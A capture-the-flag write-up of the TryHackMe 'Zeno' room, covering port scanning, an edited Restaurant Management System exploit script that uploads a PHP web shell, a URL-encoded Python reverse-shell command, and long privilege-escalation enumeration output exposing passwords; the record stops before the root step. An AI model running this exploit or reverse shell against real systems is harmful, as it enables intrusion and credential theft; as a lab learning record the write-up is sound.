<h1 align="center">Zeno<br><img width="1200px" src="https://github.com/user-attachments/assets/f0dc3ded-e114-432d-915a-899e6902a8d9"></h1>
<p align="center">June 19, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>409</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Do you have the same patience as the great stoic philosopher Zeno? Try it out!</em><br>
Click <a href="https://tryhackme.com/room/zeno">here </a>to access the "room".<br>
<img width="80px" src="https://github.com/user-attachments/assets/3d505633-b0fe-4e3b-a036-98b04ae3443c"><br></p>


<h2> Task 1 . Start up the VM</h2>
<p>Perform a penetration test against a vulnerable machine. Your end-goal is to become the root user and retrieve the two flags:</p>

<h4 align="left"> Answer the questions below</h4>

> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <strong><code>THM{070cab2c9dc622e5d25c0709f6cb0510</code></strong><br>
<p></p>


<h2> Task 2 . Get Both flags</h2>

> 2.1. <em>user.txt</em><br><a id='2.1'></a>
>> <strong><code>THM{070cab2c9dc622e5d25c0709f6cb0510</code></strong><br>
<p></p>

<h3>nmap</h3>

```bash
:~# nmap -A -sV -p- -Pn 10.10.222.29
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
...
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
...
```

<h3>dirsearch</h3>

![image](https://github.com/user-attachments/assets/d5cdd587-b578-4b66-b1ef-4051ef6e3a96)

![image](https://github.com/user-attachments/assets/671ca678-dffa-461f-83a8-58e382b1eb4b)

![image](https://github.com/user-attachments/assets/bda1be4a-3205-4b77-8dbe-3f9805404331)


<p>rms</p>

![image](https://github.com/user-attachments/assets/6d2a22b1-1fc2-41d2-bb49-222178a0aaf0)

![image](https://github.com/user-attachments/assets/f39e4fe4-3125-4c2f-94bd-b9e27c2c1bd8)

![image](https://github.com/user-attachments/assets/970c4d68-c288-43dd-837b-bec3d483c3be)

![image](https://github.com/user-attachments/assets/d962a75c-e421-4a76-8421-d4db2a046867)

![image](https://github.com/user-attachments/assets/96043564-c438-4140-a4b3-9eab02da784c)

<p>47520.py</p>

![image](https://github.com/user-attachments/assets/f30af27a-0d9f-49a7-b9bf-944f0a906ac1)

<h3>Edited</h3>

```bash
import requests
import sys

url = sys.argv[1]

if len(sys.argv[1]) < 8:
	print("[+] Usage : python rms-rce.py http://localhost:80/")
	exit()

print ("[+] Restaurant Management System Exploit, Uploading Shell")

target = url+"admin/foods-exec.php"



headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
	"Referer": "http://zeno.thm:12340/rms/admin/foods.php",
	"Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
	"Upgrade-Insecure-Requests": "1"

}

data = """

-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""
r = requests.post(target,verify=False, headers=headers,data=data)


print("[+] Shell Uploaded. Please check the URL :"+url+"images/reverse-shell.php")
```

<h3>Run</h3>

```bash
:~# python3 exploit.py http://zeno.thm:12340/rms/
[+] Restaurant Management System Exploit, Uploading Shell
[+] Shell Uploaded. Please check the URL :http://zeno.thm:12340/rms/images/reverse-shell.php

```

```bash
:~# nc -nlvp 4444
```

```bash
[:~# nc -nlvp 4444](http://zeno.thm:12340/rms/images/reverse-shell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.74.47%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27)
```

![image](https://github.com/user-attachments/assets/e19ad76a-7f3a-4b4c-b993-4c2aca647c44)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
...
bash-4.2$ cd /home
cd /home
bash-4.2$ ls
ls
edward
bash-4.2$ ls -lah
ls -lah
total 0
drwxr-xr-x.  3 root root  20 Jul 26  2021 .
dr-xr-xr-x. 17 root root 224 Jun  8  2021 ..
drwxr-xr-x.  3 root root 127 Sep 21  2021 edward
bash-4.2$ cd edward
cd edward
bash-4.2$ ls
ls
user.txt
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
bash-4.2$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
edward:x:1000:1000::/home/edward:/bin/bash
bash-4.2$ 
```



```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
bash-4.2$ curl http://10.10.74.47:8000/linpeas.sh -o linpeas.sh
curl http://10.10.74.47:8000/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  227k  100  227k    0     0  35.0M      0 --:--:-- --:--:-- --:--:-- 37.0M
bash-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
bash-4.2$ 
```

![image](https://github.com/user-attachments/assets/553cda99-40f6-4ec5-9604-e8a9229ade67)

<p>[+] Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft	0 0</p>

<h3><code>zeno</code> : <code>edward</code>code> : <code>FrobjoodAdkoonceanJa</code></h3>

```bash
+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
 default_ccache_name = KEYRING:persistent:%{uid}
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
screen Not Found

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/chsh
/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/su
/usr/bin/umount		--->	BSD/Linux(08-1996)
/usr/bin/sudo		--->	/sudo$
/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/bin/crontab
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/wall
/usr/bin/write
/usr/bin/ssh-agent
/usr/sbin/netreport
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/libexec/utempter/utempter
/usr/libexec/openssh/ssh-keysign

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/lib64//bind9-export/
/usr/lib64/mysql

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

[+] Users with capabilities
/etc/security/capability.conf Not Found

[+] Files with ACLs
files with acls in searched folders Not Found

[+] .sh files in path
/usr/bin/setup-nsssysinit.sh
/usr/bin/gettext.sh
/usr/bin/lesspipe.sh
/usr/bin/rescan-scsi-bus.sh

[+] Unexpected folders in root

[+] Files (scripts) in /etc/profile.d/
total 76
drwxr-xr-x.  2 root root  280 Jul 26  2021 .
drwxr-xr-x. 78 root root 8192 Jun 20 00:40 ..
-rw-r--r--.  1 root root  771 Nov 16  2020 256term.csh
-rw-r--r--.  1 root root  841 Nov 16  2020 256term.sh
-rw-r--r--.  1 root root  196 Mar 24  2017 colorgrep.csh
-rw-r--r--.  1 root root  201 Mar 24  2017 colorgrep.sh
-rw-r--r--.  1 root root 1741 Nov 16  2020 colorls.csh
-rw-r--r--.  1 root root 1606 Nov 16  2020 colorls.sh
-rw-r--r--.  1 root root   80 Apr  1  2020 csh.local
-rw-r--r--.  1 root root 1706 Nov 16  2020 lang.csh
-rw-r--r--.  1 root root 2703 Nov 16  2020 lang.sh
-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh
-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh
-rw-r--r--.  1 root root   81 Apr  1  2020 sh.local
-rw-r--r--.  1 root root  105 Dec 15  2020 vim.csh
-rw-r--r--.  1 root root  269 Dec 15  2020 vim.sh
-rw-r--r--.  1 root root  164 Jan 27  2014 which2.csh
-rw-r--r--.  1 root root  169 Jan 27  2014 which2.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft	0 0
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 20)
/home
/home/edward
/home/edward/.bash_logout
/home/edward/.bash_profile
/home/edward/.bashrc
/home/edward/user.txt
/home/edward/.viminfo
/home/edward/.bash_history
/home/edward/.ssh

[+] Searching others files in folders owned by me

[+] Readable files belonging to root and readable by me but not world readable

[+] Modified interesting files in the last 5mins (limit 100)
/var/log/messages
/var/log/secure
/var/log/cron
/tmp/linpeas.sh

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
./linpeas.sh: line 2344: awk: command not found

[+] Files inside /home/apache (limit 20)

[+] Files inside others home (limit 20)
/home/edward/.bash_logout
/home/edward/.bash_profile
/home/edward/.bashrc
/home/edward/user.txt
/home/edward/.viminfo
/home/edward/.ssh/authorized_keys

[+] Searching installed mail applications
mailq.postfix
newaliases.postfix
rmail.postfix
postfix
postfix
sendmail
sendmail.postfix
mailq.postfix
newaliases.postfix
rmail.postfix
postfix
sendmail
sendmail.postfix

[+] Mails (limit 50)
/var/mail/zeno
/var/mail/edward
/var/mail/root
/var/spool/mail/zeno
/var/spool/mail/edward
/var/spool/mail/root

[+] Backup files?
-rw-r--r--. 1 root root 33343 Sep 23  2021 /var/log/dmesg.old
-rw-r--r--. 1 root root 1735 Apr 10  2018 /etc/nsswitch.conf.bak

[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/www/html/rms/images/Thumbs.db (limit 20)
 -> Extracting tables from /etc/aliases.db (limit 20)
 -> Extracting tables from /etc/openldap/certs/cert8.db (limit 20)
 -> Extracting tables from /etc/openldap/certs/key3.db (limit 20)
 -> Extracting tables from /etc/openldap/certs/secmod.db (limit 20)
 -> Extracting tables from /etc/pki/nssdb/cert8.db (limit 20)
 -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)

 -> Extracting tables from /etc/pki/nssdb/key3.db (limit 20)
 -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)

 -> Extracting tables from /etc/pki/nssdb/secmod.db (limit 20)

[+] Web files?(output limit)
/var/www/:
total 0
drwxr-xr-x.  3 root root  18 Jul 26  2021 .
drwxr-xr-x. 20 root root 278 Jul 26  2021 ..
drwxr-xr-x.  3 root root  35 Jul 26  2021 html

/var/www/html:
total 8.0K
drwxr-xr-x.  3 root root   35 Jul 26  2021 .
drwxr-xr-x.  3 root root   18 Jul 26  2021 ..

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r--. 1 root root 2853 Apr  1  2020 /etc/bashrc
-rw-r--r--. 1 root root 11857 Jul 26  2021 /etc/httpd/conf/httpd.conf
Reading /etc/httpd/conf/httpd.conf
ServerRoot "/etc/httpd"
Listen 12340
Include conf.modules.d/*.conf
User apache
Group apache
ServerAdmin root@localhost
<Directory />
    AllowOverride none
    Require all denied
</Directory>
DocumentRoot "/var/www/html"
<Directory "/var/www">
    AllowOverride None
    Require all granted
</Directory>
<Directory "/var/www/html">
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
<IfModule dir_module>
    DirectoryIndex index.html
</IfModule>
<Files ".ht*">
    Require all denied
</Files>
ErrorLog "logs/error_log"
LogLevel warn
<IfModule log_config_module>
    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %b" common
    <IfModule logio_module>
      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
    </IfModule>
    CustomLog "logs/access_log" combined
</IfModule>
<IfModule alias_module>
    ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
</IfModule>
<Directory "/var/www/html/rms">
	AllowOverride None
	Options None
	Require all granted
</Directory>
<Directory "/var/www/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>
<IfModule mime_module>
    TypesConfig /etc/mime.types
    AddType application/x-compress .Z
    AddType application/x-gzip .gz .tgz
    AddType text/html .shtml
    AddOutputFilter INCLUDES .shtml
</IfModule>
AddDefaultCharset UTF-8
<IfModule mime_magic_module>
    MIMEMagicFile conf/magic
</IfModule>
EnableSendfile on
IncludeOptional conf.d/*.conf

-rw-r--r--. 1 root root 231 Apr  1  2020 /etc/skel/.bashrc
-rw-rw-rw-. 1 root root 141 Sep 21  2021 /etc/systemd/system/zeno-monitoring.service
lrwxrwxrwx. 1 root root 9 Jul 26  2021 /home/edward/.bash_history -> /dev/null
Searching possible passwords inside /home/edward/.bash_history (limit 100)

-rw-r--r--. 1 root root 231 Apr  1  2020 /home/edward/.bashrc
-rw-r--r--. 1 root root 77 Nov 16  2020 /usr/lib/tmpfiles.d/httpd.conf
Reading /usr/lib/tmpfiles.d/httpd.conf
d /run/httpd   710 root apache
d /run/httpd/htcacheclean   700 apache apache


[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r--. 1 root root 166 Apr 20  2018 /boot/.vmlinuz-3.10.0-862.el7.x86_64.hmac
-rw-r--r--. 1 root root 172 Jul 21  2021 /boot/.vmlinuz-3.10.0-1160.36.2.el7.x86_64.hmac
-rw-r--r--. 1 root root 0 Jun 20 00:39 /run/initramfs/.need_shutdown
-rw-r--r--. 1 root root 18 Apr  1  2020 /etc/skel/.bash_logout
-rw-r--r--. 1 root root 193 Apr  1  2020 /etc/skel/.bash_profile
-rw-------. 1 root root 0 Jun  8  2021 /etc/.pwd.lock
-rw-r--r--. 1 root root 129 Nov 16  2020 /etc/selinux/targeted/.policy.sha512
-rw-r--r--. 1 root root 163 Jun  8  2021 /etc/.updated
-rw-r--r--. 1 root root 0 Jun  8  2021 /var/lib/rpm/.dbenv.lock
-rw-r--r--. 1 root root 0 Jun  8  2021 /var/lib/rpm/.rpm.lock
-rw-r--r--. 1 root root 0 Jul 26  2021 /var/cache/yum/x86_64/7/.gpgkeyschecked.yum
-rw-r--r--. 1 root root 163 Jun  8  2021 /var/.updated
-rw-r--r--. 1 root root 65 Dec 16  2020 /usr/lib64/.libcrypto.so.1.0.2k.hmac
-rw-r--r--. 1 root root 65 Dec 16  2020 /usr/lib64/.libssl.so.1.0.2k.hmac
-rw-r--r--. 1 root root 65 Aug  2  2017 /usr/lib64/.libgcrypt.so.11.hmac
-rw-r--r--. 1 root root 40 Apr  1  2020 /usr/share/man/man1/..1.gz
-rw-r--r--. 1 root root 42 Sep 30  2020 /usr/share/man/man5/.k5identity.5.gz
-rw-r--r--. 1 root root 39 Sep 30  2020 /usr/share/man/man5/.k5login.5.gz
-rw-r--r--. 1 root root 2328 Apr 23  2013 /usr/share/kde4/apps/kdm/themes/CentOS7/.colorlsCZ1
-rw-r--r--. 1 root root 18 Apr  1  2020 /home/edward/.bash_logout
-rw-r--r--. 1 root root 193 Apr  1  2020 /home/edward/.bash_profile
-rw-------. 1 root root 699 Jul 26  2021 /home/edward/.viminfo

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rwxr-xr-x. 1 apache apache 233380 Jun 20 01:45 /tmp/linpeas.sh
-rw-r--r--. 1 apache apache 3736 Oct 29  2020 /var/tmp/yum-apache-yOPmUp/x86_64/7/base/repomd.xml
-rw-r--r--. 1 apache apache 0 Sep 21  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/base/cachecookie
-rw-r--r--. 1 apache apache 549 Sep 21  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/base/mirrorlist.txt
-rw-r--r--. 1 apache apache 2998 Sep  3  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/extras/repomd.xml
-rw-r--r--. 1 apache apache 0 Sep 21  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/extras/cachecookie
-rw-r--r--. 1 apache apache 589 Sep 21  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/extras/mirrorlist.txt
-rw-r--r--. 1 apache apache 3009 Sep 15  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/updates/repomd.xml
-rw-r--r--. 1 apache apache 0 Sep 21  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/updates/cachecookie
-rw-r--r--. 1 apache apache 630 Sep 21  2021 /var/tmp/yum-apache-yOPmUp/x86_64/7/updates/mirrorlist.txt

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
./linpeas.sh: line 2344: awk: command not found
uniq: write error: Broken pipe

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group apache:
./linpeas.sh: line 2253: awk: command not found
grep: write error: Broken pipe

[+] Searching passwords in config PHP files
    define('DB_PASSWORD', '');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');

[+] Finding IPs inside logs (limit 70)
     25 /var/log/wtmp:172.16.42.100
     12 /var/log/wtmp:172.16.42.10

[+] Finding passwords inside logs (limit 70)

[+] Finding emails inside logs (limit 70)
      1 /var/log/dmesg:mockbuild@kbuilder.bsys.centos.org
      1 /var/log/dmesg:dm-devel@redhat.com
      1 /var/log/dmesg.old:mockbuild@kbuilder.bsys.centos.org
      1 /var/log/dmesg.old:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)
./linpeas.sh: line 2290: awk: command not found

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/alternatives/mysqlbug:  $PASSWD | grep "^$LOGNAME:" | awk -F: '{print $5}' | sed -e 's/,.*//' > $TEMP
/etc/alternatives/mysqlbug:PASSWD="cat /etc/passwd"
/etc/nsswitch.conf.bak:passwd:     files sss
/etc/nsswitch.conf.rpmnew:passwd:     files sss
/etc/nsswitch.conf:passwd:     files sss
/etc/pam.d/password-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
/etc/pam.d/password-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
/etc/pam.d/system-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
/etc/pam.d/system-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
/etc/pki/tls/openssl.cnf:challengePassword		= A challenge password
/etc/pki/tls/openssl.cnf:challengePassword_max		= 20
/etc/pki/tls/openssl.cnf:challengePassword_min		= 4
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/selinux/semanage.conf:usepasswd=False
/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/\.pwd\.lock	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/dovecot\.passwd.*	system_u:object_r:dovecot_passwd_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/group[-\+]?	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/group\.lock	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd[-\+]?	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.OLD	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.adjunct.*	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.lock	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/ptmptmp	--	system_u:object_r:passwd_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/rc\.d/init\.d/yppasswd	--	system_u:object_r:nis_initrc_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/samba/smbpasswd	--	system_u:object_r:samba_secrets_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd	--	system_u:object_r:shadow_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd\.old	--	system_u:object_r:shadow_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/opt/vmware/(workstation|player)/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/chage	--	system_u:object_r:passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/passwd	--	system_u:object_r:passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd\.bin	--	system_u:object_r:vmware_host_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/systemd/system/yppasswdd.*	--	system_u:object_r:nis_unit_file_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/libexec/httpd-ssl-pass-dialog	--	system_u:object_r:httpd_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/chpasswd	--	system_u:object_r:passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpconv	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpunconv	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwconv	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwhistory_helper	--	system_u:object_r:updpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwunconv	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd	--	system_u:object_r:yppasswdd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd\.env	--	system_u:object_r:yppasswdd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/validate	--	system_u:object_r:chkpwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/system-config-rootpassword/system-config-rootpassword	--	system_u:object_r:bin_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password-block(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/run/yppass.*	--	system_u:object_r:yppasswdd_var_run_t:s0
/etc/sysconfig/authconfig:PASSWDALGORITHM=sha512
/etc/sysconfig/authconfig:USEPASSWDQC=no
/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
/tmp/linpeas.sh:    P)  PASSWORD=$OPTARG;;
/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
